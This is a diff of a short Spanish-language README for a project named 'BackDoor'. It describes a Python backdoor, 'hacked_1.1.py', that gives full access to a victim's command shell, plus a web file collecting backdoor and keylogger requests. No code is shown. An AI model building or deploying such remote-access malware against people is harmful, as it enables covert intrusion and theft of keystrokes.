@@ -1,9 +1,9 @@
 # BackDoor
 
-<h2>Index.php</h2>
-
-<p>Este archivo es el que guarda todas las solicitudes del backdoor y del keylogger, este tiene que tener el nombre de index para funcionar correctamente</p>
-
+<h2>Public_html</<h2>
+  
+  <p>este archivo sera el que este en la web, no cambiar</p>
+  
 <h2>hacked_1.1.py</h2>
 
 <p>Este archivo es el backdoor, este archivo da acceso completo a la cmd de la victima.</p>
